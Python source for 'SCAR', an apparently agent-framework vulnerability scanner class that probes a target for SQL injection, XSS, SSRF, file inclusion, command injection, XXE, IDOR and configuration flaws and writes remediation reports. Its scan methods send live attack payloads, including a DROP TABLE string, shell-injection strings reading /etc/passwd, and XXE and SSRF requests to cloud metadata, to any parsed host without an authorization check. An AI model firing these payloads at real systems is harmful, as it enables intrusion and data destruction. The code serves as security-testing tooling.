"""
Aevibron Agent Corps -- SCAR (Vulnerability Hunter)
Codename: SCAR
Domain: cyber_security
Role: Web app scanning, network scanning, SSL/TLS analysis, header security analysis,
      cookie security, API security testing, configuration audit, remediation reports.

Author: IRIS v1.0
"""

import json
import logging
import os
import re
import socket
import ssl
import subprocess
import time
import urllib.error
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

from base_agent import BaseAgent, Task, TaskResult


class SCAR(BaseAgent):
    """
    SCAR -- The Vulnerability Hunter. Every flaw is a target. Every target falls.
    """

    def __init__(self):
        super().__init__(
            name="SCAR",
            domain="cyber_security",
            personality="Ruthless and surgical. I find the cracks in every fortress and document them with precision.",
            capabilities=[
                "sql_injection_scan", "xss_scan", "csrf_scan", "ssrf_scan",
                "lfi_rfi_scan", "command_injection_scan", "xxe_scan",
                "idor_scan", "business_logic_scan", "network_scan",
                "ssl_tls_analysis", "header_security", "cookie_security",
                "api_security", "config_audit", "remediation_report",
            ],
        )

    def _execute_impl(self, task: Task) -> Any:
        payload = task.payload
        request = payload.get("original_request", task.description).lower()
        target = payload.get("target", "")
        if not target:
            target_match = re.search(r'(?:scan|test|audit|assess)\s+(?:of|for|on)?\s*([a-zA-Z0-9][-a-zA-Z0-9]*\.[-a-zA-Z0-9.]+)', request)
            if target_match:
                target = target_match.group(1)
            else:
                target = "example.com"
        if any(kw in request for kw in ["sql", "sqli", "injection"]):
            return self.scan_sqli(target, payload)
        elif any(kw in request for kw in ["xss", "cross site", "cross-site"]):
            return self.scan_xss(target, payload)
        elif any(kw in request for kw in ["csrf", "cross site request", "token"]):
            return self.scan_csrf(target, payload)
        elif any(kw in request for kw in ["ssrf", "server side request"]):
            return self.scan_ssrf(target, payload)
        elif any(kw in request for kw in ["lfi", "rfi", "file inclusion", "path traversal"]):
            return self.scan_lfi_rfi(target, payload)
        elif any(kw in request for kw in ["command", "cmd", "shell", "os command"]):
            return self.scan_command_injection(target, payload)
        elif any(kw in request for kw in ["xxe", "xml external"]):
            return self.scan_xxe(target, payload)
        elif any(kw in request for kw in ["idor", "access control", "authorization", "privilege"]):
            return self.scan_idor(target, payload)
        elif any(kw in request for kw in ["header", "security header", "csp", "hsts"]):
            return self.analyze_headers(target)
        elif any(kw in request for kw in ["cookie", "session", "secure cookie"]):
            return self.analyze_cookies(target)
        elif any(kw in request for kw in ["api", "rest", "graphql", "endpoint"]):
            return self.scan_api(target, payload)
        elif any(kw in request for kw in ["ssl", "tls", "certificate", "cipher"]):
            return self.analyze_ssl(target)
        elif any(kw in request for kw in ["config", "configuration", "audit", "misconfig"]):
            return self.audit_config(target, payload)
        else:
            return self.full_vulnerability_scan(target, payload)

    def _make_request(self, url: str, method: str = "GET", data: Optional[bytes] = None,
                     headers: Optional[Dict[str, str]] = None, timeout: int = 10) -> Tuple[int, Dict[str, str], str]:
        try:
            req_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
            if headers:
                req_headers.update(headers)
            req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
            response = urllib.request.urlopen(req, timeout=timeout)
            body = response.read().decode("utf-8", errors="ignore")
            return response.status, dict(response.headers), body
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore") if e.read() else ""
            return e.code, dict(e.headers), body
        except Exception as e:
            return 0, {}, str(e)

    def scan_sqli(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        sqli_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--",
            "1' AND 1=1--", "1' AND 1=2--", "'; DROP TABLE users;--",
            "' OR 'x'='x", "1 AND 1=1", "1 AND 1=2", "' OR sleep(5)--",
        ]
        test_params = ["id", "user", "page", "search", "q", "query", "name", "cat", "category", "item"]
        for param in test_params:
            for sqli in sqli_payloads:
                test_url = f"{base_url}/?{param}={urllib.request.quote(sqli)}"
                try:
                    status, headers, body = self._make_request(test_url)
                    sql_errors = ["sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
                        "SQLServer", "JDBC", "ODBC", "sybase", "DB2",
                        "You have an error in your SQL", "Warning: mysql_",
                        "unclosed quotation mark", "quoted string not properly terminated"]
                    body_lower = body.lower()
                    for error in sql_errors:
                        if error.lower() in body_lower:
                            findings.append({
                                "type": "SQL Injection", "severity": "CRITICAL",
                                "url": test_url, "parameter": param, "payload": sqli,
                                "evidence": f"SQL error detected: {error}",
                                "remediation": "Use parameterized queries/prepared statements.",
                            })
                            break
                except Exception as e:
                    self._logger.debug(f"[SCAR] SQLi test error: {e}")
        return {
            "target": target, "scan_type": "SQL Injection",
            "findings": findings, "total_tests": len(test_params) * len(sqli_payloads),
            "vulnerabilities_found": len(findings),
            "risk_level": "CRITICAL" if findings else "LOW",
        }

    def scan_xss(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        xss_payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>", "<input onfocus=alert('XSS') autofocus>",
        ]
        test_params = ["q", "search", "query", "name", "comment", "message", "input", "data"]
        for param in test_params:
            for xss in xss_payloads:
                test_url = f"{base_url}/?{param}={urllib.request.quote(xss)}"
                try:
                    status, headers, body = self._make_request(test_url)
                    if xss in body:
                        findings.append({
                            "type": "Reflected XSS", "severity": "HIGH",
                            "url": test_url, "parameter": param, "payload": xss,
                            "evidence": "Payload reflected without proper encoding",
                            "remediation": "Encode all output. Use CSP headers.",
                        })
                except Exception as e:
                    self._logger.debug(f"[SCAR] XSS test error: {e}")
        return {
            "target": target, "scan_type": "Cross-Site Scripting (XSS)",
            "findings": findings, "total_tests": len(test_params) * len(xss_payloads),
            "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if findings else "LOW",
        }

    def scan_csrf(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        try:
            status, headers, body = self._make_request(base_url)
            forms = re.findall(r'<form[^>]*>.*?</form>', body, re.DOTALL | re.IGNORECASE)
            for form in forms:
                has_token = any(token in form.lower() for token in ["csrf", "_token", "xsrf", "authenticity", "nonce"])
                set_cookie = headers.get("Set-Cookie", "")
                has_samesite = "samesite" in set_cookie.lower()
                if not has_token and not has_samesite:
                    findings.append({
                        "type": "Missing CSRF Protection", "severity": "HIGH",
                        "url": base_url,
                        "evidence": "Form without CSRF token and no SameSite cookie",
                        "remediation": "Add CSRF tokens. Set SameSite=Strict on session cookies.",
                    })
        except Exception as e:
            self._logger.debug(f"[SCAR] CSRF scan error: {e}")
        return {
            "target": target, "scan_type": "CSRF",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "MEDIUM" if findings else "LOW",
        }

    def scan_ssrf(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22", "http://127.0.0.1:80",
            "file:///etc/passwd", "dict://localhost:11211/stat",
        ]
        test_params = ["url", "uri", "path", "redirect", "callback", "proxy", "src", "dest"]
        for param in test_params:
            for ssrf in ssrf_payloads:
                test_url = f"{base_url}/?{param}={urllib.request.quote(ssrf)}"
                try:
                    status, headers, body = self._make_request(test_url)
                    if "ami-id" in body or "instance-id" in body:
                        findings.append({
                            "type": "SSRF (AWS Metadata)", "severity": "CRITICAL",
                            "url": test_url, "parameter": param, "payload": ssrf,
                            "evidence": "AWS metadata service accessible",
                            "remediation": "Validate URLs. Use allowlists. Disable metadata access.",
                        })
                    elif "root:" in body and ":/bin/" in body:
                        findings.append({
                            "type": "SSRF (File Read)", "severity": "CRITICAL",
                            "url": test_url, "parameter": param, "payload": ssrf,
                            "evidence": "Local file read possible",
                            "remediation": "Block file:// protocol. Validate URLs against allowlist.",
                        })
                except Exception as e:
                    self._logger.debug(f"[SCAR] SSRF test error: {e}")
        return {
            "target": target, "scan_type": "SSRF",
            "findings": findings, "total_tests": len(test_params) * len(ssrf_payloads),
            "vulnerabilities_found": len(findings),
            "risk_level": "CRITICAL" if findings else "LOW",
        }

    def scan_lfi_rfi(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        lfi_payloads = [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php",
        ]
        test_params = ["file", "path", "page", "include", "view", "load", "document", "folder", "dir"]
        for param in test_params:
            for lfi in lfi_payloads:
                test_url = f"{base_url}/?{param}={urllib.request.quote(lfi)}"
                try:
                    status, headers, body = self._make_request(test_url)
                    if "root:" in body and ":/bin/" in body:
                        findings.append({
                            "type": "Local File Inclusion (LFI)", "severity": "HIGH",
                            "url": test_url, "parameter": param, "payload": lfi,
                            "evidence": "/etc/passwd content retrieved",
                            "remediation": "Use allowlists. Never use user input in file paths.",
                        })
                except Exception as e:
                    self._logger.debug(f"[SCAR] LFI/RFI test error: {e}")
        return {
            "target": target, "scan_type": "LFI/RFI",
            "findings": findings, "total_tests": len(test_params) * len(lfi_payloads),
            "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if findings else "LOW",
        }

    def scan_command_injection(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        cmd_payloads = ["; id", "| id", "` id `", "$(id)", "; whoami", "| whoami", "&& id", "|| id", "; cat /etc/passwd", "$(sleep 5)", "; sleep 5"]
        test_params = ["host", "ip", "domain", "cmd", "command", "exec", "ping", "lookup", "query"]
        for param in test_params:
            for cmd in cmd_payloads:
                test_url = f"{base_url}/?{param}={urllib.request.quote(cmd)}"
                try:
                    start = time.time()
                    status, headers, body = self._make_request(test_url)
                    elapsed = time.time() - start
                    if "uid=" in body or "gid=" in body:
                        findings.append({
                            "type": "Command Injection", "severity": "CRITICAL",
                            "url": test_url, "parameter": param, "payload": cmd,
                            "evidence": "Command output reflected in response",
                            "remediation": "Never pass user input to system commands. Use parameterized APIs.",
                        })
                    elif elapsed > 4 and "sleep" in cmd:
                        findings.append({
                            "type": "Command Injection (Time-based)", "severity": "CRITICAL",
                            "url": test_url, "parameter": param, "payload": cmd,
                            "evidence": f"Time delay detected: {elapsed:.2f}s",
                            "remediation": "Use parameterized APIs. Never execute user input.",
                        })
                except Exception as e:
                    self._logger.debug(f"[SCAR] Command injection test error: {e}")
        return {
            "target": target, "scan_type": "Command Injection",
            "findings": findings, "total_tests": len(test_params) * len(cmd_payloads),
            "vulnerabilities_found": len(findings),
            "risk_level": "CRITICAL" if findings else "LOW",
        }

    def scan_xxe(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]
        try:
            for xxe in xxe_payloads:
                headers = {"Content-Type": "application/xml"}
                status, resp_headers, body = self._make_request(base_url, method="POST", data=xxe.encode(), headers=headers)
                if "root:" in body and ":/bin/" in body:
                    findings.append({
                        "type": "XXE (File Read)", "severity": "CRITICAL",
                        "url": base_url, "payload": xxe[:100],
                        "evidence": "Local file read via XXE",
                        "remediation": "Disable external entity processing. Use safe XML parsers.",
                    })
                elif "ami-id" in body:
                    findings.append({
                        "type": "XXE (SSRF)", "severity": "CRITICAL",
                        "url": base_url, "payload": xxe[:100],
                        "evidence": "AWS metadata accessible via XXE",
                        "remediation": "Disable DTD processing. Use JSON instead of XML where possible.",
                    })
        except Exception as e:
            self._logger.debug(f"[SCAR] XXE test error: {e}")
        return {
            "target": target, "scan_type": "XXE",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "CRITICAL" if findings else "LOW",
        }

    def scan_idor(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        test_ids = [1, 2, 3, 4, 5, 100, 999, 1000]
        for test_id in test_ids:
            test_urls = [
                f"{base_url}/user/{test_id}", f"{base_url}/api/user/{test_id}",
                f"{base_url}/profile?id={test_id}", f"{base_url}/order/{test_id}",
                f"{base_url}/document/{test_id}",
            ]
            for url in test_urls:
                try:
                    status, headers, body = self._make_request(url)
                    if status == 200:
                        if any(indicator in body.lower() for indicator in ["email", "username", "phone", "address", "credit_card"]):
                            findings.append({
                                "type": "IDOR", "severity": "HIGH",
                                "url": url,
                                "evidence": "Accessible resource without proper authorization",
                                "remediation": "Implement authorization checks. Use UUIDs instead of sequential IDs.",
                            })
                            break
                except Exception as e:
                    self._logger.debug(f"[SCAR] IDOR test error: {e}")
        return {
            "target": target, "scan_type": "IDOR",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if findings else "LOW",
        }

    def analyze_headers(self, target: str) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        try:
            status, headers, body = self._make_request(base_url)
            headers_lower = {k.lower(): v for k, v in headers.items()}
            required_headers = {
                "strict-transport-security": {"name": "HSTS", "severity": "HIGH",
                    "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"},
                "content-security-policy": {"name": "CSP", "severity": "HIGH",
                    "recommendation": "Add: Content-Security-Policy with strict directives"},
                "x-frame-options": {"name": "X-Frame-Options", "severity": "MEDIUM",
                    "recommendation": "Add: X-Frame-Options: DENY or SAMEORIGIN"},
                "x-content-type-options": {"name": "X-Content-Type-Options", "severity": "MEDIUM",
                    "recommendation": "Add: X-Content-Type-Options: nosniff"},
                "referrer-policy": {"name": "Referrer-Policy", "severity": "LOW",
                    "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin"},
                "permissions-policy": {"name": "Permissions-Policy", "severity": "LOW",
                    "recommendation": "Add: Permissions-Policy with restricted features"},
            }
            for header_key, info in required_headers.items():
                if header_key not in headers_lower:
                    findings.append({
                        "type": f"Missing {info['name']}", "severity": info["severity"],
                        "header": header_key, "recommendation": info["recommendation"],
                    })
            dangerous = ["x-powered-by", "server"]
            for header in dangerous:
                if header in headers_lower:
                    findings.append({
                        "type": "Information Disclosure", "severity": "LOW",
                        "header": header, "value": headers_lower[header],
                        "recommendation": f"Remove or obfuscate {header} header",
                    })
        except Exception as e:
            self._logger.debug(f"[SCAR] Header analysis error: {e}")
        return {
            "target": target, "scan_type": "Security Headers",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "MEDIUM" if findings else "LOW",
        }

    def analyze_cookies(self, target: str) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        try:
            status, headers, body = self._make_request(base_url)
            set_cookie = headers.get("Set-Cookie", "")
            if set_cookie:
                cookie_attrs = set_cookie.lower()
                if "secure" not in cookie_attrs:
                    findings.append({"type": "Missing Secure Flag", "severity": "HIGH",
                        "cookie": set_cookie[:100], "recommendation": "Add Secure flag to all cookies"})
                if "httponly" not in cookie_attrs:
                    findings.append({"type": "Missing HttpOnly Flag", "severity": "HIGH",
                        "cookie": set_cookie[:100], "recommendation": "Add HttpOnly flag to session cookies"})
                if "samesite" not in cookie_attrs:
                    findings.append({"type": "Missing SameSite Attribute", "severity": "MEDIUM",
                        "cookie": set_cookie[:100], "recommendation": "Add SameSite=Strict or SameSite=Lax to cookies"})
            else:
                findings.append({"type": "No Cookies Detected", "severity": "INFO",
                    "recommendation": "If using sessions, ensure cookies are properly secured"})
        except Exception as e:
            self._logger.debug(f"[SCAR] Cookie analysis error: {e}")
        return {
            "target": target, "scan_type": "Cookie Security",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "MEDIUM" if findings else "LOW",
        }

    def scan_api(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        base_url = f"http://{target}"
        api_paths = ["/api/v1/users", "/api/v1/user", "/api/users", "/api/user",
            "/api/v1/auth", "/api/auth", "/api/v1/login", "/api/login",
            "/api/v1/admin", "/api/admin", "/api/v1/data", "/api/data",
            "/graphql", "/api/graphql", "/api/v1/graphql",
            "/swagger.json", "/api-docs", "/openapi.json"]
        for path in api_paths:
            url = f"{base_url}{path}"
            try:
                status, headers, body = self._make_request(url)
                if status == 200:
                    findings.append({
                        "type": "API Endpoint Accessible", "severity": "INFO",
                        "url": url,
                        "evidence": f"Status {status}, accessible without authentication",
                        "recommendation": "Ensure all API endpoints require proper authentication",
                    })
                    acao = headers.get("Access-Control-Allow-Origin", "")
                    if "*" in acao:
                        findings.append({
                            "type": "CORS Misconfiguration", "severity": "MEDIUM",
                            "url": url, "evidence": "Access-Control-Allow-Origin: *",
                            "recommendation": "Restrict CORS to specific origins",
                        })
                    if len(body) > 10000:
                        findings.append({
                            "type": "Potential Data Exposure", "severity": "MEDIUM",
                            "url": url, "evidence": f"Large response body: {len(body)} bytes",
                            "recommendation": "Limit API response size. Implement pagination.",
                        })
            except Exception as e:
                self._logger.debug(f"[SCAR] API scan error: {e}")
        return {
            "target": target, "scan_type": "API Security",
            "findings": findings, "endpoints_tested": len(api_paths),
            "vulnerabilities_found": len(findings),
            "risk_level": "MEDIUM" if findings else "LOW",
        }

    def analyze_ssl(self, target: str) -> Dict[str, Any]:
        findings = []
        try:
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    if version in ["TLSv1", "TLSv1.1"]:
                        findings.append({
                            "type": "Weak TLS Version", "severity": "HIGH",
                            "evidence": f"Using {version}",
                            "recommendation": "Disable TLS 1.0 and 1.1. Use TLS 1.2 or 1.3 only.",
                        })
                    from datetime import datetime
                    not_after = cert.get("notAfter")
                    if not_after:
                        expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                        days_until = (expiry - datetime.utcnow()).days
                        if days_until < 30:
                            findings.append({
                                "type": "Certificate Expiring Soon", "severity": "MEDIUM",
                                "evidence": f"Expires in {days_until} days",
                                "recommendation": "Renew certificate immediately",
                            })
                    issuer = cert.get("issuer", [])
                    subject = cert.get("subject", [])
                    if issuer == subject:
                        findings.append({
                            "type": "Self-Signed Certificate", "severity": "MEDIUM",
                            "evidence": "Certificate is self-signed",
                            "recommendation": "Use certificates from a trusted CA",
                        })
                    if cipher:
                        cipher_name = cipher[0]
                        weak_ciphers = ["RC4", "DES", "3DES", "MD5", "NULL", "EXPORT"]
                        if any(wc in cipher_name for wc in weak_ciphers):
                            findings.append({
                                "type": "Weak Cipher", "severity": "HIGH",
                                "evidence": f"Using weak cipher: {cipher_name}",
                                "recommendation": "Disable weak cipher suites",
                            })
        except Exception as e:
            findings.append({
                "type": "SSL/TLS Error", "severity": "INFO",
                "evidence": str(e),
                "recommendation": "Ensure SSL/TLS is properly configured",
            })
        return {
            "target": target, "scan_type": "SSL/TLS Analysis",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "MEDIUM" if findings else "LOW",
        }

    def audit_config(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        config_checks = [
            ("/.env", "Exposed .env file", "CRITICAL"),
            ("/.git/config", "Exposed Git repository", "CRITICAL"),
            ("/config.php", "Exposed PHP config", "HIGH"),
            ("/config.json", "Exposed JSON config", "HIGH"),
            ("/phpinfo.php", "Exposed PHP info", "MEDIUM"),
            ("/server-status", "Exposed Apache status", "MEDIUM"),
            ("/.htaccess", "Exposed .htaccess", "LOW"),
            ("/robots.txt", "Information disclosure in robots.txt", "INFO"),
            ("/sitemap.xml", "Information disclosure in sitemap", "INFO"),
            ("/crossdomain.xml", "Flash cross-domain policy", "MEDIUM"),
            ("/.well-known/security.txt", "Security contact info", "INFO"),
        ]
        base_url = f"http://{target}"
        for path, issue, severity in config_checks:
            try:
                url = f"{base_url}{path}"
                status, headers, body = self._make_request(url)
                if status == 200:
                    findings.append({
                        "type": issue, "severity": severity,
                        "url": url,
                        "evidence": f"Accessible with status {status}",
                        "recommendation": f"Restrict access to {path} or remove if not needed",
                    })
            except Exception as e:
                self._logger.debug(f"[SCAR] Config audit error: {e}")
        return {
            "target": target, "scan_type": "Configuration Audit",
            "findings": findings, "vulnerabilities_found": len(findings),
            "risk_level": "CRITICAL" if any(f["severity"] == "CRITICAL" for f in findings) else "HIGH" if findings else "LOW",
        }

    def full_vulnerability_scan(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        self._logger.info(f"[SCAR] Starting full vulnerability scan on {target}")
        results = {
            "target": target,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "sqli": self.scan_sqli(target, payload),
            "xss": self.scan_xss(target, payload),
            "csrf": self.scan_csrf(target, payload),
            "ssrf": self.scan_ssrf(target, payload),
            "lfi_rfi": self.scan_lfi_rfi(target, payload),
            "command_injection": self.scan_command_injection(target, payload),
            "xxe": self.scan_xxe(target, payload),
            "idor": self.scan_idor(target, payload),
            "headers": self.analyze_headers(target),
            "cookies": self.analyze_cookies(target),
            "api": self.scan_api(target, payload),
            "ssl": self.analyze_ssl(target),
            "config": self.audit_config(target, payload),
        }
        all_findings = []
        for scan_type, scan_results in results.items():
            if isinstance(scan_results, dict) and "findings" in scan_results:
                for finding in scan_results["findings"]:
                    finding["scan_type"] = scan_type
                    all_findings.append(finding)
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        all_findings.sort(key=lambda x: severity_order.get(x.get("severity", "LOW"), 5))
        results["aggregated_findings"] = all_findings
        results["total_vulnerabilities"] = len(all_findings)
        results["critical_count"] = len([f for f in all_findings if f.get("severity") == "CRITICAL"])
        results["high_count"] = len([f for f in all_findings if f.get("severity") == "HIGH"])
        results["medium_count"] = len([f for f in all_findings if f.get("severity") == "MEDIUM"])
        results["low_count"] = len([f for f in all_findings if f.get("severity") == "LOW"])
        results["remediation_report"] = self._generate_remediation_report(all_findings)
        self._logger.info(f"[SCAR] Full scan complete. Found {len(all_findings)} vulnerabilities on {target}")
        return results

    def _generate_remediation_report(self, findings: List[Dict[str, Any]]) -> str:
        lines = ["=" * 70, "  VULNERABILITY REMEDIATION REPORT", "  Generated by SCAR -- Aevibron Agent Corps", "=" * 70, ""]
        for i, finding in enumerate(findings, 1):
            lines.append(f"{i}. [{finding.get('severity', 'UNKNOWN')}] {finding.get('type', 'Unknown')}")
            lines.append(f"   URL: {finding.get('url', 'N/A')}")
            lines.append(f"   Evidence: {finding.get('evidence', 'N/A')}")
            lines.append(f"   Remediation: {finding.get('remediation', 'Review and fix')}")
            lines.append("")
        lines.extend(["", "GENERAL RECOMMENDATIONS:",
            "1. Implement defense in depth with multiple security layers",
            "2. Keep all software and dependencies up to date",
            "3. Use a Web Application Firewall (WAF)",
            "4. Implement proper logging and monitoring",
            "5. Conduct regular security assessments",
            "6. Follow OWASP Top 10 guidelines", "", "=" * 70])
        return "\n".join(lines)

__all__ = ["SCAR"]
